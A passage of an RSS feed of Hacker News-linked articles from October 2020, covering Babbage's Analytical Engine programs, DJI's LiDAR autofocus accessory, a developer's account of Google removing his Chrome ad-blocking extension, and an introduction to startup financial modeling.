<p>The mathematician and inventor Charles Babbage wrote 26 programs between 1836 and 1841 for the unfinished "Analytical Engine" (AE). The code is embedded implicitly in tables summarizing program traces. In this talk, I present the programming architecture of Babbage’s mechanical computer based on the first code written for the machine. The AE had a processor separate from memory, and worked using a kind of dataflow approach. The stream of arithmetical operations was independent from the stream of memory addresses. Special "combinatorial" cards allowed the processor to execute FOR and WHILE loops. Combinatorial cards also allowed independent looping through the stream of memory addresses. Quite sophisticated computations were possible and illustrate why Babbage talked about the possibility of doing "algebra" with his machine. The programs I will discuss predate by several years the account published by Menabrea in 1842 and translated later by Lady Lovelace with notes of her own.</p>

<h3>Download</h3>

<!-- %h3 Embed/Share -->

<h3>Tags</h3>

</div>





</div>]]>
            </description>
            <link>https://media.ccc.de/v/vcfb20_-_137_-_de_-_202010101600_-_the_programming_architecture_of_babbages_analytical_engine_-_prof_dr_raul_rojas</link>
            <guid isPermaLink="false">hacker-news-small-sites-24856235</guid>
            <pubDate>Thu, 22 Oct 2020 09:25:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using Lidar to Add Autofocus to a Manual Focus Lens]]>
            </title>
            <description>
<![CDATA[
Score 86 | Comments 15 (<a href="https://news.ycombinator.com/item?id=24856072">thread link</a>) | @giuliomagnifico
<br/>
October 22, 2020 | http://sonyaddict.com/2020/10/20/f-0-95-autofocus-on-any-camera-with-lidar/ | <a href="https://web.archive.org/web/*/http://sonyaddict.com/2020/10/20/f-0-95-autofocus-on-any-camera-with-lidar/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-13082"> 

				

					

					<!-- .entry-meta -->
     				
					<div>
					
						<p><iframe title="RS2.  Amazing Gimbal with AUTOFOCUS for any camera. New LiDAR sensor with focus motors!" width="540" height="304" src="https://www.youtube.com/embed/Y7UEHryq7zo?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>DJI has a 3D focus accessory for the <a href="https://www.bhphotovideo.com/c/product/1585352-REG/dji_cp_rn_00000094_01_rs_2_gimbal_stabilizer.html/BI/20068/KBID/13800/" target="_blank" rel="noopener noreferrer">DJI RS 2</a> that allows you to autofocus any manual lens using LiDAR using what is called time of flight technology. The technology has a few limitations like it won’t autofocus beyond 4m (22ft) because there aren’t enough photons bouncing back at that distance and the system has to be calibrated for each lens. The system also won’t work with lenses that do not have a hard stop.</p>
<p>The system is pretty basic at this time and it is dumb zone AF, but this might be improved with time. The follow focus seems to work best between 1m and 4m from testing and the calibration program, which checks two distances during calibration. The gimbal can store profiles for 3 lenses so you do not have to repeat calibration every time. AF is handled completely independently of the camera and the lens is focused via <a href="https://www.bhphotovideo.com/c/product/1078023-REG/slr_magic_slr_3595m_cine_ii_e_35mm_0_95_ii_m.html/BI/20068/KBID/13800/" target="_blank" rel="noopener noreferrer">gears</a> so it will focus even with the camera off and since it uses LiDAR it will even focus in the dark. DJI also makes an accessory to <a href="https://www.bhphotovideo.com/c/product/1447215-REG/dji_cp_rn_00000026_01_ronin_s_part_19_focus.html/BI/20068/KBID/13800/">add gears to your manual focus lenses</a>.</p>
<p>The 3D focus module isn’t available yet, but it will be in a few weeks for $169 and it requires the <a href="https://www.bhphotovideo.com/c/product/1585352-REG/dji_cp_rn_00000094_01_rs_2_gimbal_stabilizer.html/BI/20068/KBID/13800/" target="_blank" rel="noopener noreferrer">focus motors and RS2</a>, but not the Ravens Eye wireless transmitter that was used in the video. If you want the setup to track you then you will need the Ravens Eye wireless transmitter. This system also makes older cameras with poor AF relevant again, which is a nice bonus.</p>
<p><strong>DJI RS 2 and RSC 2:&nbsp;</strong><a href="https://bhpho.to/3lS3D9p" target="_blank" rel="noopener noreferrer">B&amp;H Photo</a>&nbsp;/&nbsp;<a href="http://moment.8ocm68.net/Nd17P" target="_blank" rel="noopener noreferrer">shopmoment</a>&nbsp;/&nbsp;<a href="https://amzn.to/2SVaKld" target="_blank" rel="noopener noreferrer">Amazon</a>&nbsp;/&nbsp;<a href="http://adorama.rfvk.net/LvA73" target="_blank" rel="noopener noreferrer">Adorama</a></p>


												
					</div><!-- .entry-content -->
					
					<div>

						<p><span>This entry was posted in <a href="http://sonyaddict.com/category/accessories/" rel="category tag">Accessories</a></span><span> and tagged  <a href="http://sonyaddict.com/tag/dji/" rel="tag">DJI</a>, <a href="http://sonyaddict.com/tag/dji-rs-2/" rel="tag">DJI RS 2</a>, <a href="http://sonyaddict.com/tag/dji-rsc-2/" rel="tag">DJI RSC 2</a>, <a href="http://sonyaddict.com/tag/gimbal/" rel="tag">Gimbal</a>, <a href="http://sonyaddict.com/tag/lidar/" rel="tag">LiDAR</a>, <a href="http://sonyaddict.com/tag/lidar-af/" rel="tag">LiDAR AF</a>, <a href="http://sonyaddict.com/tag/lidar-autofocus/" rel="tag">LiDAR Autofocus</a></span>. Bookmark the <a title="Permalink to f/0.95 Autofocus on Any Camera With LiDAR" href="http://sonyaddict.com/2020/10/20/f-0-95-autofocus-on-any-camera-with-lidar/">permalink</a>. Trackbacks are closed, but you can <a title="Post a comment" href="#respond">post a comment</a>.

					</p></div><!-- .entry-utility -->
					
				</div></div>]]>
            </description>
            <link>http://sonyaddict.com/2020/10/20/f-0-95-autofocus-on-any-camera-with-lidar/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24856072</guid>
            <pubDate>Thu, 22 Oct 2020 08:57:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Google obliterated my 4 year old Chrome extension with 24k+ users (2016)]]>
            </title>
            <description>
<![CDATA[
Score 141 | Comments 123 (<a href="https://news.ycombinator.com/item?id=24855582">thread link</a>) | @Fiveplus
<br/>
October 22, 2020 | https://by.graffino.com/how-google-obliterated-my-24k-users-chrome-extension-eeb14c040a39#.13m3awp18 | <a href="https://web.archive.org/web/*/https://by.graffino.com/how-google-obliterated-my-24k-users-chrome-extension-eeb14c040a39#.13m3awp18">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><div><div><p>
              After 3 months of trying everything I could think of, I give up.
              I don’t think I will ever develop anything for the Google
              ecosystem again. I’m not angry, I’m not doing this out of spite.
              I just don’t think it is worth it to invest any amount of effort
              to build something on a platform that turned out to be so
              unreliable.
            </p>  <h2>Please scroll down to read the latest update.</h2>  <p>
              I started developing my first extension back in 2010, when Apple
              finally decided to implement proper extension support in Safari.
              Exciting times. I spent a weekend writing my first Safari
              Extension, an ad blocker called “Cleaner Facebook”. I must
              confess it was ugly, and by today’s standards, very poorly
              written, but it did the job.
            </p> <p>
              After a few weeks while browsing Facebook using Chrome, the
              annoying ads popped up and I figured that it’ll be worthwhile to
              port it over, so I did. I also made it available to everyone via
              <a href="http://apps.graffino.com/" target="_blank" title="App Development">Graffino’s apps playground.</a></p> <p>
              Months later the due to some policy changes in Chrome, I moved
              to the Chrome Web Store where I made it available for free under
              the name “Cleaner Facebook”.
            </p> <p>
              What happened next was beyond my wildest expectations. It
              quickly gathered around 4.000 users and over the last year it
              surged to 24.000+ users. Whenever I pushed an update, the
              numbers would spike.
            </p> <p>
              I got quite a few offers to sell it, so others could push
              advertising through it. Thing is, I never wanted to make any
              money off it and I felt like I was betraying my users. So, I
              kept it and improved it constantly. It worked so well because I
              needed it to work well, I was using it daily and my users loved
              it. It got a 5 stars rating and over 85 reviews.
            </p> <blockquote>
              Google has been notified that some of your materials allegedly
              infringe upon the trademarks of others.
            </blockquote> <p>
              At the end of May this year, I received an email from Google
              telling me that my extension violated Facebook’s trademark and
              got taken down. There was no information how to solve the issue,
              no way to appeal. Google washed its hands clean and directed all
              inquiries to an automatically generated email address. This
              email address was a black hole that never responded to any of my
              emails.
            </p> <figure><img src="https://by.graffino.com/_nuxt/img/bcfd01f.png" alt="Google's notification that they removed Graffino's Ads removal app from the store."> <figcaption>
                The original infringement and taken down notice (shortened).
              </figcaption></figure> <p>
              I figured out that the name might be an issue although there
              were
              <a href="https://chrome.google.com/webstore/search/facebook?hl=en-US" target="_blank">a lot of other extensions</a>
              with the same name in the store. Even so, I changed the name of
              my extension to “Cleaner — for Facebook” and resubmitted it to
              the store where it got placed “In review”.
            </p> <p>
              Over the next weeks I never received any email from the Chrome
              Store other than the initial take down notice. When I logged in
              again, I found my extension was still “Taken down” and the “In
              review” flag gone.
            </p> <p>
              I went on to search for a Developer Support page, but after half
              an hour of searching I found out that there is none. There is no
              support whatsoever for the developer besides Google’s own
              documentation. If you encounter an issue that you can’t solve
              yourself, you’re stranded. There’s no contact info. No one to
              write to.
            </p> <p>
              After getting really frustrated that day, I vented out sending
              out a nasty email to removals@google.com. Not sure it helped.
            </p> <p>
              The next day I poked around and found a support form intended
              for Chrome Web Store users. In my desperation I figured this was
              my only option left.
            </p> <p>
              About a week later, I got my first reply from <em>Google</em>.
              Although it sounded nice, it wasn’t really helpful. Most
              probably due to the fact it was a canned response, totally
              unrelated to my issue.
            </p> <figure><img src="https://by.graffino.com/_nuxt/img/a38f41d.png" alt="Google's first email response to Graffino's complaint."> <figcaption>First canned response</figcaption></figure> <p>
              Later that day, I fired a few other emails, telling them that my
              extension was not under review and the cause for the take down
              was not flagging. I also submitted another message via the
              support form I used before. My requests got closed with a
              <em>“Thanks for your feedback.”</em> canned response.
            </p> <figure><img src="https://by.graffino.com/_nuxt/img/c1a157e.png" alt="Google's first email response to Graffino's complaint."> <figcaption>“Thank you for your feedback” response</figcaption></figure> <p>
              Meanwhile my extension’s user base was dwindling, and I could do
              absolutely nothing about it.
            </p> <figure><img src="https://by.graffino.com/_nuxt/img/ee3fd6a.png" alt="Google's first email response to Graffino's complaint."> <figcaption>
                Screenshot from the Developer Dashboard made on the 18th of
                July.
              </figcaption></figure> <p>
              After another two weeks I finally gave up and sent this final
              email. I got a reply that my case was “Reopened”. It’s been a
              month and I didn’t hear back since, so I don’t think I will ever
              get my extension back on the store.
            </p> <figure><img src="https://by.graffino.com/_nuxt/img/3e2eaf4.png" alt="Google's first email response to Graffino's complaint."> <figcaption>Final email from my side.</figcaption></figure> <p>
              I’m not playing the victim here, and I don’t expect this post to
              solve anything for my extension. I just want you to think twice
              before creating a revenue stream based on the Chrome Web Store.
            </p> <p>
              Google has great automated tools and services, to help
              developers ramp up and deliver their apps to users quickly and
              painless. Most of the time these tools work perfectly. The
              problems arise when they don’t.
            </p> <p>
              I have never experienced such frustration, and such feelings of
              helplessness from any other major player out there. A similar
              issue with the
              <a href="https://safari-extensions.apple.com/details/?id=com.graffino.cleaner-for-facebook-86755BRK69" target="_blank">“Cleaner Facebook” Safari extension”</a>, got promptly solved by Apple in under three days.
            </p> <p>
              Google has a record of very bad user support. Basically, if your
              issue is not listed in the “Support Forums” you’re screwed. If I
              would have based my business on the Chrome Web store, I would be
              out of business by now.
            </p>  <h2>Update 8.09.2016</h2> <p>
              I never imagined this would generate this amount of attention:
              featured by
              <strong>Medium, 100k+</strong> views, heated discussions on
              <a href="https://www.reddit.com/r/programming/comments/51mgix/how_google_obliterated_my_4_year_old_chrome/" target="_blank">Reddit</a>
              or
              <a href="https://news.ycombinator.com/item?id=12442048" target="_blank">Hackernews</a>. I don’t really expect this to change anything for me, but I’m
              glad people are speaking up. If Google would implement a paid
              support option like Apple does for its developers, I’m sure a
              lot of pain would be avoided.
            </p> <p>
              I try to read everything, but I don’t respond on Medium (hate
              the commenting system), but you can ping me on Twitter.
            </p> <h2>To answer the most common questions:</h2> <p>1.<em> “Why don’t you change the name completely?”</em></p> <p>
              Well, because using “for Facebook” in the name is considered
              <a href="http://www.inta.org/TrademarkBasics/FactSheets/Pages/FairUse.aspx" target="_blank">fair use</a>. Also, when managing an app or extension with that many users,
              you don’t really want to confuse the users by renaming it to a
              completely different thing over night. It’s also an extension
              that only works on Facebook. I might also be infringing with the
              icon.
            </p> <p>
              So, you see, I really need guidelines to do this. Again, my
              problem is with the way this was handled, not the takedown
              itself.
            </p> <p>
              2.
              <em>“The extension was taken down because it was blocking ads.”
              </em></p> <p>
              This is simply untrue. I don't believe I was intentionally
              targeted. I was simply unlucky enough to be targeted by
              automated tools. Even the way my requests were handled weren’t
              done with malicious intent by Google. I think I’m just an edge
              case for which their support tools aren’t equipped to deal with.
            </p> <h2>Update: 9.09.2016</h2> <p>
              I received an email from Google today in which they’re
              expressing their apologies about the incident. It seems that
              they cannot do anything for the current store entry until the
              original complainant retracts his complain.
            </p> <figure><img src="https://by.graffino.com/_nuxt/img/3e2eaf4.png" alt="Google's first email response to Graffino's complaint."> <figcaption>Final email from my side.</figcaption></figure> <p>
              They offered me clear options though. We’re currently assessing
              what the best option might be. As I said in the article, this
              wasn’t an intentional targeting but a slip-up of their support
              which they’re trying to fix.
            </p> <p>
              Hopefully I will have the time to write a follow-up once all
              this is over. I didn’t expect or wanted this kind of attention,
              these have been 2 stressful days for me, trying to keep up with
              all the requests and messages, as I do have a job and my own
              company to run.
            </p> <p>
              It also happens that today is my birthday. I guess receiving a
              response from Google was my birthday present :).
            </p>  <h2>Update: 10.09.2016</h2> <p>
              You can still find the
              <a href="http://apps.graffino.com/" target="_blank">ad blocker extension</a>
              here. However, you will not be able to run it. Chrome made
              changes so that extensions cannot be side-loaded without an
              enterprise profile.
            </p> <h2>Final Update: 12.09.2016</h2> <p>
         …</p></div></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://by.graffino.com/how-google-obliterated-my-24k-users-chrome-extension-eeb14c040a39#.13m3awp18">https://by.graffino.com/how-google-obliterated-my-24k-users-chrome-extension-eeb14c040a39#.13m3awp18</a></em></p>]]>
            </description>
            <link>https://by.graffino.com/how-google-obliterated-my-24k-users-chrome-extension-eeb14c040a39#.13m3awp18</link>
            <guid isPermaLink="false">hacker-news-small-sites-24855582</guid>
            <pubDate>Thu, 22 Oct 2020 07:10:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The virtual device farm for rendering websites on multiple devices]]>
            </title>
            <description>
<![CDATA[
Score 102 | Comments 27 (<a href="https://news.ycombinator.com/item?id=24855342">thread link</a>) | @seleniumbase
<br/>
October 21, 2020 | https://seleniumbase.io/devices/?url=news.ycombinator.com | <a href="https://web.archive.org/web/*/https://seleniumbase.io/devices/?url=news.ycombinator.com">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://seleniumbase.io/devices/?url=news.ycombinator.com</link>
            <guid isPermaLink="false">hacker-news-small-sites-24855342</guid>
            <pubDate>Thu, 22 Oct 2020 06:06:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Startup Financial Modeling: What is a Financial Model? (2016)]]>
            </title>
            <description>
<![CDATA[
Score 228 | Comments 49 (<a href="https://news.ycombinator.com/item?id=24853787">thread link</a>) | @aaronbski
<br/>
October 21, 2020 | https://www.mathventurepartners.com/blog/2016/9/15/startup-financial-modeling-part-1-what-is-a-financial-model | <a href="https://web.archive.org/web/*/https://www.mathventurepartners.com/blog/2016/9/15/startup-financial-modeling-part-1-what-is-a-financial-model">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

  
  <article id="article-57daf9aad2b857a2108683be" data-item-id="57daf9aad2b857a2108683be">

    

    <div>
      
        <div data-layout-label="Post Body" data-type="item" data-updated-on="1473969767493" id="item-57daf9aad2b857a2108683be"><div><div><div data-block-type="2" id="block-7c825fcce3d916c3aa66"><div><p><em>This article was originally published over on Startup Rocket&nbsp;</em><a href="https://www.startuprocket.com/articles/startup-financial-modeling-part-1-what-is-a-financial-model" target="_blank"><em>here</em></a><em>, and written by Will Little and Troy Henikoff.</em></p><p><em>This series is the result of a friendly debate I had recently with&nbsp;</em><a href="https://www.mathventurepartners.com/troy-henikoff" target="_blank">Troy Henikoff</a><em>&nbsp;(former Techstars Chicago Accelerator Managing Director)&nbsp;regarding the best approach for founders to take when building a financial model. More accurately, the “debate” was a strong adverse reaction from Troy after I shared a template I built for Prota Ventures’ portfolio companies. His feedback was, essentially, to never use a template and instead build each model from scratch.</em></p><p><em>He invited me to a 90-minute lecture he gave where he overwhelmingly convinced me and the room that, indeed, founders need to take the time necessary to build their models from scratch. After I asked him where I could find his lecture material online, he suggested we co-author this article series since there weren’t many solid resources available. We sincerely hope you find this series helpful.&nbsp;</em></p><p>Our plan is to break this out into a four-part series and guide you through the components necessary for building your own financial model from scratch:</p><ul data-rte-list="default"><li><p><a href="https://www.mathventurepartners.com/blog/2016/9/15/startup-financial-modeling-part-1-what-is-a-financial-model" target="_blank">Part 1: The Why and What of Financial Modeling</a></p></li><li><p><a href="https://www.mathventurepartners.com/blog/2016/10/2/startup-financial-modeling-part-2-start-with-your-assumptions" target="_blank">Part 2: Assumptions</a></p></li><li><p><a href="https://www.mathventurepartners.com/blog/2016/10/2/startup-financial-modeling-part-3-the-income-statement-and-custom-detail-tabs" target="_blank">Part 3: Income Statement and Custom Detail Tabs</a></p></li><li><p><a href="https://www.mathventurepartners.com/blog/2016/10/7/startup-financial-modeling-part-4-the-balance-sheet-cash-flow-and-unit-economics" target="_blank">Part 4: Cash Flow, Balance Sheet and Keeping the Model Updated</a></p></li></ul><p>In short, a financial model is an abstract mathematical representation of how a company works (and more importantly, how it will work going forward). The model has inputs and outputs. The inputs are the assumptions that drive the model, things like what drives your customer acquisition cost, what your churn rates are, how much you pay people, etc. The outputs are a set of projections that show how the company will perform if the assumptions are true. One model can produce multiple sets of projections given different assumptions.</p><p>Based on a set of assumptions, a financial model is used to make smart decisions (e.g. how many sales people to hire and what to pay them). The model includes financial projections that are tied mathematically to the assumptions, which allows operators to “play with the variables” in order to understand how certain decisions might affect the future health of their company.</p><p><strong>Troy has an important story to share on this topic:</strong></p><p>“When fundraising for SurePayroll, we had some very high level financials in the pitch deck. Inevitably, VC’s would ask where the numbers came from. I would tell them that we had a very detailed financial model that drove it, I was setting the bait…</p><p>They would ask to be sent a copy of the model and I would refuse. I would only share it by first sitting down with them and an associate and reviewing the model in person and after that 90 minute session, I would leave them a copy of the model to play with further.</p><blockquote><p>They would insist that they could figure it out without the meeting, but I ALWAYS held my ground. I wanted the meeting not just to save them time and frustration learning a new model, but more importantly to get more face time with them in a situation where I was going to shine.</p></blockquote><p>I knew the model inside and out since I built it; I could answer any question about any cell and look like a genius. In the end, I did eight&nbsp;of these meetings and EVERY ONE of the firms that did the 90 minute meeting with me on the financial model either made an investment in the company or made an offer to invest in the company.&nbsp;<strong>Every single one</strong>.”</p><p>While it’s easy to search around and find a template to use, those templates were built by someone with a particular business in mind. Since every business is unique, this will lead you into trouble.</p><p>While it’s often helpful to&nbsp;<em>learn&nbsp;</em>from other people’s models to ensure, for example, that you aren’t missing anything important, you should never build your model using their template. You’ll end up banging your head against a wall when you need to change things, and you’ll inevitably be confused about some nuance that will come back to haunt you since you don’t understand it.</p><blockquote><p>In other words, while you may think that a template will help you save time, what you are actually doing is acquiring “technical debt” that will end up costing you more time in the long run.</p></blockquote><p>Plus, it’s critical to understand every column, row, cell and tab in your spreadsheet for two key reasons; it will help you better manage your business, and when the time comes to explain it to an investor, you’ll be able to explain exactly how it works and increase your odds of landing funding.</p><p>Since most people are using the financial model to communicate projections to investors, it is critical that you speak the investors’ language. They are used to having financials in Excel, so you should build your model in Excel.</p><blockquote><p>Google sheets is convenient for making changes and having multiple people editing, but sending an investor a model in Google sheets signals that you are not financially savvy.</p></blockquote><p>Investors are also used to seeing three standard statements; an income statement, a balance sheet, and a statement of cash flow. &nbsp;Each of these is more credible if it has BOTH the past performance and the future projections in the same spreadsheet.</p><p>Your spreadsheet should contain a tab for each of these outputs along with an “assumptions” tab and custom detail tabs needed to help calculate the main outputs. We’ll walk through a specific example later in this series so you have a better understanding of what this should look like.</p><p>Because of various accounting nuances – such as fixed asset depreciation and deferring revenue – if you assign ten accountants to finish your books at the end of the year, you’ll get ten different answers for how much profit (or loss) you had in the year. While hopefully not far off from the others, each will have a slightly different report of your “profit” based on their accounting opinions.</p><blockquote><p>However, the balance of your bank account is a specific number to point at; it’s a fact that your ten accountants should agree on.</p></blockquote><p>Therefore, it’s important to remember that your financial model will have your own opinions baked in regarding your profit. This means that examining your cash flow carefully as you fine-tune your business assumptions is critical.</p><p>Having a solid financial model is a significant step in communicating to investors that you are a logical thinker with a defensible plan and clearly understand your business and the levers that drive it. &nbsp;&nbsp;</p><p>Nobody expects your model to be perfect, as a matter of fact, when we present a model, we always open with the same line:</p><blockquote><p><em>“The only thing we know for sure about this model is that it is wrong. But, if we look critically at it we can better understand the drivers of the business and what we need to be focused on to reduce our risk.” &nbsp;</em></p></blockquote><p>Keep in mind, investors are looking for the big home runs, but they are also looking at reducing their risk. The model can help them get comfortable with the risk.</p><p>– – –</p><p><em>In our next post in this series, we’ll dive in a step-by-step guide of how to build a financial model, starting with the assumptions tab.&nbsp;</em><a href="https://satchel.works/@wclittle/subscribe" target="_blank">Subscribe</a><em>&nbsp;to Will’s newsletter to get notified when the next articles are up. As we mentioned above, feel free to ping us on Twitter (</em><a href="https://twitter.com/wclittle" target="_blank"><em>@wclittle</em></a><em>,&nbsp;</em><a href="https://twitter.com/troyhenikoff" target="_blank"><em>@troyhenikoff</em></a><em>) with any questions.</em></p></div></div></div></div></div>
      
    </div>


    

    
      
    

    

  </article>

  

  

  
  
  

</div></div>]]>
            </description>
            <link>https://www.mathventurepartners.com/blog/2016/9/15/startup-financial-modeling-part-1-what-is-a-financial-model</link>
            <guid isPermaLink="false">hacker-news-small-sites-24853787</guid>
            <pubDate>Thu, 22 Oct 2020 00:28:21 GMT</pubDate>
        </item>
    </channel>
</rss>
